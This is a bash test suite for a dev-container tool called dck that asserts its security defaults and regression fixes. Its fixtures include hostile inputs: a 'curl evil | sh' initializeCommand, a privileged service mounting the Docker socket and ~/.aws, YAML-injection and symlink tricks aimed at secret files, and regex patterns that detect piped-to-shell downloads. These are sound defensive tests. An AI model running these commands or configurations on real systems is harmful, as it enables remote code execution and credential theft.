# shellcheck shell=bash
# Scope: security — the posture of docs/SECURITY.md, asserted over the
# rendered template, the images and the code.

DCK="$DCK_REPO/bin/dck"
use_fakes
export DCK_BACKEND=compose DCK_NONINTERACTIVE=1 DCK_NO_DIGEST=1

render_all() {
  # Every combination that changes the compose file: flavours, ports, layers.
  local f i=0
  for f in python-3.13 node-24 debian; do
    i=$((i + 1))
    mkdir -p "$SANDBOX/r$i"; git -C "$SANDBOX/r$i" init -q
    "$DCK" init --repo "$SANDBOX/r$i" --flavour "$f" --ssh-port "2204$i" --port web=4321 --port api=8000 \
      --agents --clis "claude codex cursor opencode pi cline grok" --yes >/dev/null 2>&1 || fail "fixture: init $f"
  done
  mkdir -p "$SANDBOX/r0"; git -C "$SANDBOX/r0" init -q
  "$DCK" init --repo "$SANDBOX/r0" --ssh-port 0 --yes >/dev/null 2>&1 || fail "fixture: init without ssh"
}

rendered() { cat "$SANDBOX"/r*/docker/local/docker-compose.yaml "$SANDBOX"/r*/docker/local/app/Dockerfile "$SANDBOX"/r*/.devcontainer/devcontainer.json; }

test_loopback_binds() {
  render_all
  local ports
  ports="$(grep -hE '^ *- "[0-9.]*:?[0-9]+:[0-9]+"' "$SANDBOX"/r*/docker/local/docker-compose.yaml)"
  assert_ne "$ports" "" "the rendered files publish ports"
  assert_no_match "$ports" '^ *- "([0-9]+:|0\.0\.0\.0:)' "every published port binds an address"
  assert_eq "$(printf '%s\n' "$ports" | grep -vc '"127\.0\.0\.1:' || true)" "0" "every published port binds 127.0.0.1"
  assert_not_contains "$(cat "$SANDBOX/r0/docker/local/docker-compose.yaml")" ":22\"" "ssh_port = 0 publishes no sshd port"
}

test_bind_override_is_explicit() {
  mkdir -p "$SANDBOX/b"; git -C "$SANDBOX/b" init -q
  "$DCK" init --repo "$SANDBOX/b" --ssh-port 22050 --yes >/dev/null 2>&1
  printf 'bind = "0.0.0.0"\n' | cat - "$SANDBOX/b/.devcontainer/dck.toml" > "$SANDBOX/t" && mv "$SANDBOX/t" "$SANDBOX/b/.devcontainer/dck.toml"
  run_cmd "$DCK" init --repo "$SANDBOX/b" --yes
  assert_contains "$(cat "$SANDBOX/b/docker/local/docker-compose.yaml")" '"0.0.0.0:22050:22"' "only an explicit bind in dck.toml widens a port"
}

test_no_privileges_in_templates() {
  render_all
  local r; r="$(rendered; cat "$DCK_REPO"/src/template/*/*.tmpl "$DCK_REPO"/src/template/*/*/*.tmpl)"
  assert_not_contains "$r" "cap_add" "no cap_add"
  assert_not_contains "$r" "privileged" "no privileged"
  assert_not_contains "$r" "docker.sock" "no Docker socket"
  assert_no_match "$r" '(security_opt|seccomp[:=]unconfined|apparmor[:=]unconfined|network_mode: *host|pid: *host|ipc: *host|userns_mode)' "no sandbox escape hatch"
  assert_no_match "$r" '\$\{HOME\}|~/\.ssh|\.gitconfig|\.ssh_host' "no host home, ~/.ssh or .gitconfig mount"
  assert_no_match "$r" '(^|[^_])(id_ed25519|id_rsa|id_ecdsa)\b' "no private key is referenced"
}

test_per_project_auth_volumes() {
  render_all
  local vols
  vols="$(sed -n '/>>> dck:volumes >>>/,/<<< dck:volumes <<</p' "$SANDBOX/r1/docker/local/docker-compose.yaml")"
  assert_no_match "$vols" 'external:|name:' "volumes are compose-managed, hence prefixed per project (no shared external volume)"
  assert_contains "$vols" "  claude: {}" "each CLI home gets its own per-project volume"
}

test_supply_chain_pins() {
  render_all
  assert_no_match "$(rendered)" ':latest|@main|--branch main' "no floating reference in rendered files"
  assert_match "$(grep -h '^ARG BASE_IMAGE=' "$SANDBOX/r1/docker/local/app/Dockerfile")" '@sha256:[0-9a-f]{64}$' "the base image is pinned by digest"
  local w
  for w in "$DCK_REPO"/.github/workflows/*.yml; do
    assert_no_match "$(grep -E 'uses:' "$w")" '@(v[0-9]|main|master)' "$(basename "$w"): actions are pinned by commit SHA"
  done
  assert_no_match "$(cat "$DCK_REPO"/images/*/Dockerfile "$DCK_REPO"/images/common/* "$DCK_REPO"/lib/layers/*.sh)" '(curl|wget)[^|]*\|[[:space:]]*(sudo[[:space:]]+)?(ba|z|da)?sh\b' "nothing is piped into a shell"
}

test_no_baked_host_keys_and_hardened_sshd() {
  assert_contains "$(cat "$DCK_REPO/images/common/install.sh")" "rm -f /etc/ssh/ssh_host_*" "package host keys are removed at build"
  assert_no_match "$(cat "$DCK_REPO"/images/*/Dockerfile "$DCK_REPO"/images/common/*)" 'ssh-keygen' "no key is generated at build"
  local d; d="$(cat "$DCK_REPO/images/common/sshd_config.conf")"
  assert_match "$d" '^PasswordAuthentication no$' "sshd: no password"
  assert_match "$d" '^PermitRootLogin no$' "sshd: no root"
  assert_match "$d" '^PermitUserEnvironment no$' "sshd: clients cannot inject environment"
  assert_match "$d" '^GatewayPorts no$' "sshd: forwarded ports stay local"
  assert_match "$d" '^X11Forwarding no$' "sshd: no X11"
  assert_contains "$(cat "$DCK_REPO/lib/entrypoint.sh")" 'echo "AllowUsers $DCK_USER"' "sshd: only the dev user may log in"
}

test_no_private_key_leaves_the_host() {
  # The only key material dck sends anywhere is the dedicated key's .pub.
  assert_no_match "$(grep -nE 'id_ed25519|IDENTITY' "$DCK_REPO"/lib/*.sh | grep -E 'cat |< |cp |docker|exec' | grep -v '\.pub')" '.' "only the .pub of the dck key is ever read for sending"
  assert_not_contains "$(cat "$DCK_REPO"/lib/entrypoint.sh)" ".ssh_host" "the entrypoint never reads a host ~/.ssh mount"
  assert_contains "$(cat "$DCK_REPO/lib/sshconf.py")" '"  ForwardAgent yes"' "keys reach the container by agent forwarding"
}

test_init_refuses_symlinks() {
  mkdir -p "$SANDBOX/s/docker/local" "$SANDBOX/secret"; git -C "$SANDBOX/s" init -q
  echo "PRIVATE-KEY-MATERIAL" > "$SANDBOX/secret/id_test"
  ln -s "$SANDBOX/secret/id_test" "$SANDBOX/s/docker/local/docker-compose.yaml"
  run_cmd "$DCK" init --repo "$SANDBOX/s" --dry-run
  assert_rc 5 "init refuses a symlinked managed file"
  assert_not_contains "$RUN_OUT$RUN_ERR" "PRIVATE-KEY-MATERIAL" "a symlink's target is never shown"
  mkdir -p "$SANDBOX/t/docker" "$SANDBOX/outside"; git -C "$SANDBOX/t" init -q
  ln -s "$SANDBOX/outside" "$SANDBOX/t/docker/local"
  run_cmd "$DCK" init --repo "$SANDBOX/t" --yes
  assert_rc 5 "init refuses a directory that resolves outside the repository"
  assert_eq "$(ls -A "$SANDBOX/outside")" "" "nothing is written outside the repository"
}

test_setup_never_writes_through_symlinks() {
  mkdir -p "$SANDBOX/p"; git -C "$SANDBOX/p" init -q
  "$DCK" init --repo "$SANDBOX/p" --yes >/dev/null 2>&1
  ln -s "$SANDBOX/victim" "$SANDBOX/p/docker/local/app/.env"
  run_cmd bash -c 'cd "$1" && "$2" setup' _ "$SANDBOX/p" "$DCK"
  assert_absent "$SANDBOX/victim" "setup never creates a file through a dangling .env link"
  assert_contains "$RUN_ERR" "a symlink is involved" "and says why"
  echo keep > "$SANDBOX/victim"; chmod 644 "$SANDBOX/victim"
  run_cmd bash -c 'cd "$1" && "$2" setup' _ "$SANDBOX/p" "$DCK"
  assert_mode "$SANDBOX/victim" 644 "setup never chmods a link's target"
}

test_python_is_isolated_everywhere() {
  assert_contains "$(cat "$DCK_REPO/lib/common.sh")" '"$DCK_PY" -I "$DCK_LIB/dckpy.py"' "the launcher runs python in isolated mode"
  assert_no_match "$(grep -hE 'python3 ' "$DCK_REPO"/lib/entrypoint.sh)" 'python3 -[^I]|python3 - ' "the root entrypoint runs python in isolated mode (cwd is the repository)"
  local box="$SANDBOX/ws"
  mkdir -p "$box/home/dev" "$box/ws"
  printf 'raise SystemExit("planted shlex imported")\n' > "$box/ws/shlex.py"
  run_cmd env DCK_USER=dev DCK_HOME="$box/home/dev" DCK_WORKSPACE="$box/ws" \
    bash -c 'cd "$1" && . "$2" && dck_env_profile' _ "$box/ws" "$DCK_REPO/lib/entrypoint.sh"
  assert_rc 0 "a planted module in the workspace is never imported by the entrypoint"
}

test_no_eval_and_no_secret_printing() {
  assert_no_match "$(cat "$DCK_REPO"/bin/* "$DCK_REPO"/lib/*.sh "$DCK_REPO"/install.sh)" '(^|[[:space:];])eval[[:space:]]' "no eval in the shell code"
  assert_no_match "$(cat "$DCK_REPO"/lib/*.py)" '\b(eval|exec)\(' "no eval/exec in the python code"
  assert_no_match "$(cat "$DCK_REPO"/lib/*.sh "$DCK_REPO"/lib/*.py)" 'print.*(environ\[|getenv\().*(KEY|TOKEN)' "no code prints a key or token value"
}

test_security_doc_covers_each_default() {
  local s="$DCK_REPO/docs/SECURITY.md" topic
  assert_file "$s" "docs/SECURITY.md exists"
  for topic in "Threat model" "loopback" "cap_add" "agent forwarding" "Host keys" "per project" "SHA-256" "0600" "safe.directory" "Reporting"; do
    assert_contains "$(cat "$s")" "$topic" "SECURITY.md covers: $topic"
  done
}

# ---- regressions from the v0.1.0 Final Review security pass ------------------------

sec_repo() {
  local r="$SANDBOX/$1"; shift
  mkdir -p "$r"; git -C "$r" init -q
  "$DCK" init --repo "$r" --ssh-port 22060 --no-herdr "$@" --yes >/dev/null 2>&1 || fail "fixture: init $r"
  printf '%s\n' "$r"
}
in_repo() { local r="$1"; shift; run_cmd bash -c 'cd "$1" && shift && "$@"' _ "$r" "$@"; }

test_agent_is_forwarded_only_to_loopback() {
  local r; r="$(sec_repo fwd)"
  printf 'bind = "203.0.113.7"\n' | cat - "$r/.devcontainer/dck.toml" > "$SANDBOX/t" && mv "$SANDBOX/t" "$r/.devcontainer/dck.toml"
  echo "fwd-app-1" > "$DCK_FAKE_STATE/ps"
  in_repo "$r" "$DCK" setup
  : > "$DCK_FAKE_LOG"
  in_repo "$r" "$DCK" ssh
  assert_rc 5 "dck ssh refuses a repository-chosen non-loopback address"
  in_repo "$r" "$DCK" herdr add
  assert_rc 5 "dck herdr add refuses it too"
  assert_eq "$(fake_calls ssh)" "" "no ssh connection (and no forwarded agent) went anywhere"
  run_cmd python3 -c 'import sys; sys.path.insert(0, sys.argv[1]); import sshconf; sshconf.block("dck-x", "203.0.113.7", 22, "dev", "/k", "/kh")' "$DCK_REPO/lib"
  assert_ne "$RUN_RC" "0" "the include writer only accepts 127.0.0.1 as HostName"
}

test_repository_config_reaching_the_host_needs_trust() {
  local r; r="$(sec_repo pre)"
  in_repo "$r" "$DCK" up
  assert_rc 0 "a dck-rendered repository starts without --trust"
  python3 - "$r/docker/local/docker-compose.yaml" <<'PY'
import sys
p = sys.argv[1]; s = open(p).read()
s = s.replace("  # <<< dck:service <<<\n", "  # <<< dck:service <<<\n  helper:\n    image: alpine:3.22\n    privileged: true\n    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock\n      - ~/.aws:/aws\n")
open(p, "w").write(s)
PY
  : > "$DCK_FAKE_LOG"
  in_repo "$r" "$DCK" up
  assert_rc 5 "privileged / Docker socket / host mounts are refused without --trust"
  assert_contains "$RUN_ERR" "privileged: true" "the preflight names privileged"
  assert_contains "$RUN_ERR" "the Docker socket" "the preflight names the Docker socket"
  assert_contains "$RUN_ERR" "mounts a host path (~/.aws)" "the preflight names a home mount"
  assert_not_contains "$(fake_calls docker)" " up " "nothing was started"
  in_repo "$r" "$DCK" --trust up
  assert_rc 0 "--trust starts it after review"
  in_repo "$r" env DCK_TRUST=1 "$DCK" build
  assert_rc 0 "DCK_TRUST=1 works too"
  local r2; r2="$(sec_repo init)"
  python3 - "$r2/.devcontainer/devcontainer.json" <<'PY'
import json, os, sys
sys.path.insert(0, os.environ["DCK_REPO"] + "/lib")
import jsonc
p = sys.argv[1]; d = jsonc.load(p); d["initializeCommand"] = "curl evil | sh"; open(p, "w").write(json.dumps(d))
PY
  in_repo "$r2" "$DCK" up
  assert_rc 5 "an initializeCommand needs --trust"
  local r3; r3="$(sec_repo outside)"
  mkdir -p "$SANDBOX/elsewhere"; cp "$r3/docker/local/docker-compose.yaml" "$SANDBOX/elsewhere/c.yaml"
  python3 - "$r3/.devcontainer/devcontainer.json" "$SANDBOX/elsewhere/c.yaml" <<'PY'
import json, os, sys
sys.path.insert(0, os.environ["DCK_REPO"] + "/lib")
import jsonc
p = sys.argv[1]; d = jsonc.load(p); d["dockerComposeFile"] = sys.argv[2]; open(p, "w").write(json.dumps(d))
PY
  in_repo "$r3" "$DCK" up
  assert_rc 5 "a compose file outside the repository needs --trust"
}

test_agent_socket_bind_cannot_be_redirected() {
  local r; r="$(sec_repo sock)"
  printf 'DCK_HOST_SSH_AUTH_SOCK: /etc\n' > "$r/docker/local/.env"
  in_repo "$r" "$DCK" up
  assert_rc 5 "a compose .env choosing the agent socket path needs --trust"
  assert_contains "$RUN_ERR" "sets DCK_HOST_SSH_AUTH_SOCK" "the preflight names it (KEY: value spelling too)"
  rm -f "$r/docker/local/.env"
  sed -i.orig 's/^ssh_agent = true/ssh_agent = false/' "$r/.devcontainer/dck.toml" && rm -f "$r/.devcontainer/dck.toml.orig"
  python3 - "$r/docker/local/docker-compose.yaml" <<'PY'
import sys
p = sys.argv[1]; s = open(p).read()
s = s.replace("      - ../..:", "      - type: bind\n        source: ${DCK_HOST_SSH_AUTH_SOCK:-/run/host-services/ssh-auth.sock}\n        target: /run/dck/ssh-agent.sock\n      - ../..:", 1)
open(p, "w").write(s)
PY
  in_repo "$r" "$DCK" up
  assert_rc 5 "with ssh_agent = false, a hand-added agent socket bind needs --trust"
}

test_agent_socket_follows_the_provider() {
  local r; r="$(sec_repo prov)"
  printf '29.0.0|Docker Desktop|docker-desktop\n' > "$DCK_FAKE_STATE/info_out"
  in_repo "$r" "$DCK" up
  assert_rc 0 "up succeeds on Docker Desktop"
  assert_eq "$(cat "$DCK_FAKE_STATE/last_agent_sock")" "/run/host-services/ssh-auth.sock" "Docker Desktop: its shared host agent socket"
  printf '29.0.0|Ubuntu 24.04|colima\n' > "$DCK_FAKE_STATE/info_out"
  in_repo "$r" "$DCK" up --recreate
  assert_rc 0 "up succeeds on another provider"
  assert_eq "$(cat "$DCK_FAKE_STATE/last_agent_sock")" "/dev/null" "another provider without a host agent socket: /dev/null, never a guessed path"
  assert_contains "$RUN_ERR" "not shared with this Docker provider" "and says so"
  rm -f "$DCK_FAKE_STATE/info_out"
}

test_backup_never_written_through_a_planted_link() {
  local r; r="$(sec_repo bak)"
  printf 'RUN echo mine\n' >> "$r/docker/local/app/Dockerfile"
  run_cmd python3 - "$DCK_REPO/lib" "$r/docker/local/app/Dockerfile" "$SANDBOX/victim" <<'PY'
import os, sys, time
sys.path.insert(0, sys.argv[1])
import render
path, victim = sys.argv[2], sys.argv[3]
now = time.time()
for d in range(-2, 5):
    stamp = time.strftime("%Y%m%d%H%M%S", time.gmtime(now + d))
    os.symlink(victim, "%s.dck-bak-%s" % (path, stamp))
dest = render.backup(path)
print(os.path.islink(dest), os.path.exists(victim))
PY
  assert_eq "$RUN_OUT" "False False" "a backup skips planted names and never writes through a link"
}

test_overlay_is_quoted_and_not_interpolated() {
  local r; r="$(sec_repo ov)"
  python3 - "$r/.devcontainer/devcontainer.json" <<'PY'
import json, os, sys
sys.path.insert(0, os.environ["DCK_REPO"] + "/lib")
import jsonc
p = sys.argv[1]; d = jsonc.load(p); d["containerEnv"] = {"HOST_SECRET_COPY": "${GITHUB_TOKEN}"}; open(p, "w").write(json.dumps(d))
PY
  mkdir -p "$SANDBOX/tmp"
  in_repo "$r" env TMPDIR="$SANDBOX/tmp" "$DCK" up
  assert_contains "$(cat "$SANDBOX/tmp/dck-$(id -u)/ov-overlay.yml")" 'HOST_SECRET_COPY: "$${GITHUB_TOKEN}"' "\$ is escaped: compose never interpolates host variables into the container"
  python3 - "$r/.devcontainer/devcontainer.json" <<'PY'
import json, os, sys
sys.path.insert(0, os.environ["DCK_REPO"] + "/lib")
import jsonc
p = sys.argv[1]; d = jsonc.load(p); d["containerEnv"] = {}
d["mounts"] = ["source=cache,target=/x\n    privileged: true,type=volume"]; open(p, "w").write(json.dumps(d))
PY
  in_repo "$r" env TMPDIR="$SANDBOX/tmp" "$DCK" --trust up
  assert_rc 3 "a mount target with a newline is refused (no YAML injection)"
}

test_env_examples_stay_inside_the_repository() {
  local r; r="$(sec_repo envx)"
  mkdir -p "$r/docker/local/a
b" "$SANDBOX/outside"
  printf 'X=1\n' > "$r/docker/local/a
b/.env.example"
  printf 'Y=1\n' > "$SANDBOX/outside/.env.example"
  ln -s "$SANDBOX/outside" "$r/docker/local/linked"
  run_cmd python3 -I "$DCK_REPO/lib/dckpy.py" devc env-examples --dir "$r/docker/local" --repo "$r"
  assert_eq "$RUN_OUT" "$r/docker/local/app/.env.example" "only regular examples inside the repository are acted on"
  in_repo "$r" "$DCK" setup
  assert_absent "$SANDBOX/outside/.env" "nothing is created through a linked directory"
}

test_symlinked_env_and_compose_are_ignored() {
  local r; r="$(sec_repo lnk)"
  printf 'AWS_SECRET_ACCESS_KEY=x\n' > "$SANDBOX/creds"
  ln -s "$SANDBOX/creds" "$r/docker/local/app/.env"
  in_repo "$r" "$DCK" doctor --json
  assert_not_contains "$RUN_OUT" "AWS_SECRET_ACCESS_KEY" "doctor never reads a symlinked .env (not even names)"
  assert_contains "$RUN_OUT" "is a symlink; dck ignores it" "and says so"
  local r2; r2="$(sec_repo lnkc)"
  mv "$r2/docker/local/docker-compose.yaml" "$SANDBOX/real.yaml"
  ln -s "$SANDBOX/real.yaml" "$r2/docker/local/docker-compose.yaml"
  in_repo "$r2" "$DCK" ps
  assert_rc 3 "a symlinked compose file is refused"
}

test_foreign_project_name_is_announced() {
  local r; r="$(sec_repo proj)"
  printf 'COMPOSE_PROJECT_NAME=work\n' > "$r/docker/local/.env"
  in_repo "$r" "$DCK" ps
  assert_contains "$RUN_ERR" "compose project 'work'" "a project not named after the repository is announced"
}

test_missing_public_key_is_restored() {
  local r; r="$(sec_repo pub)"
  in_repo "$r" "$DCK" setup
  local k="$HOME/.config/dck/ssh/id_ed25519"
  rm -f "$k.pub"
  in_repo "$r" "$DCK" up
  assert_rc 0 "up succeeds when the .pub was deleted"
  assert_eq "$(cut -d' ' -f1-2 "$k.pub")" "$(ssh-keygen -y -f "$k" | cut -d' ' -f1-2)" "the public half is derived from the private key"
}

test_workflow_inputs_go_through_env() {
  local w; w="$(cat "$DCK_REPO/.github/workflows/images.yml")"
  assert_contains "$w" 'SUFFIX: ${{ steps.tag.outputs.suffix }}' "the tag name reaches the script through env"
  assert_not_contains "$(sed -n '/name: record digest/,/upload-artifact/p' "$DCK_REPO/.github/workflows/images.yml" | sed -n '/run: |/,$p')" '${{' "no expression is expanded inside a run: script"
}
